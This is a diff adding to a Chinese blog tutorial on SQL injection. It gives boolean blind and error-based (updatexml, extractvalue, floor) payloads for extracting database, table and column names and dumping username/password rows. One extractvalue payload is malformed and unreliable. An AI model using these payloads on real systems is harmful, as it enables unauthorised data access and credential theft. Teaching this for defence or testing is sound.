@@ -354,6 +354,53 @@ var _hmt = _hmt || [];
 
 #依次执行可以查出数据库名，但是工程量有点大，可以自己写一个小公举使用python</code></pre>
 <p>4，获取表名</p>
+<p>获取表名的话和联合查询差不多，只是更加复杂</p>
+<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;查询出的数据库名&quot; limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> #判断页面是否报错来确定查询出来的第一个表名的第一个字符是否为a
+
+#limit <span class="number">0</span>,<span class="number">1</span>主要是截取查询结果中的第一个结果
+#limit <span class="number">1</span>,<span class="number">1</span>截取插寻结果的第二个结果</code></pre>
+<p>5，获取列名</p>
+<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;查询出的数据库名&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;查询出的表名&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>
+
+#和查询表名是一样的原理</code></pre>
+<p>6，取数据，脱裤</p>
+<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> &quot;列名&quot; <span class="keyword">from</span> &quot;表名&quot; limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>
+
+#查询第一行数据的第一个字母是否是a
+#limit主要是显示查询结果的第一个结果，limit <span class="number">1</span>,<span class="number">1</span>就是第二个结果</code></pre>
+<p>布尔盲注手工的话非常的繁琐，但是只要知道原理，也能自己写一个小脚本跑，还是sqlmap香</p>
+<h3 id="报错注入">报错注入</h3>
+<p>报错注入主要是利用数据库错误回显，前提是服务器开启了错误回显</p>
+<p>常见MySQL报错函数</p>
+<pre><code class="highlight mysql">--xpath语法错误
+extractvalue()  --查询节点内容
+updatexml()     --修改查询到的内容
+
+他们的第二个参数要求是满足xpath语法的字符串
+如果不满足要求就会报错，并且将查询结果放在报错信息里
+
+--主键重复（duplicate entry）
+floor()        --返回小于等于该值得最大整数
+
+只要count，rand，group by 三个连用就会造成这种主键重复报错</code></pre>
+<p>1，尝试用单引号报错</p>
+<p>2，获取数据库名</p>
+<pre><code class="highlight mysql">?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
+
+0x7e是&quot;~&quot;符号的16进制，在这作为分隔符</code></pre>
+<p>3，获取表名</p>
+<pre><code class="highlight mysql">?id=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),0x7e),1)</code></pre>
+<p>4，获取列名</p>
+<pre><code class="highlight mysql">?id=1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),0x7e),1)</code></pre>
+<p>5，获取数据</p>
+<pre><code class="highlight mysql">?id=1  and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)</code></pre>
+<p>其他函数payload语法</p>
+<pre><code class="highlight mysql">--extractvalue
+?id=1 and extractvalue(1,concat(select database()),0x7e)
+
+--floor()
+?id=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
+<h3 id="时间型盲注">时间型盲注</h3>
 
 </div>
 
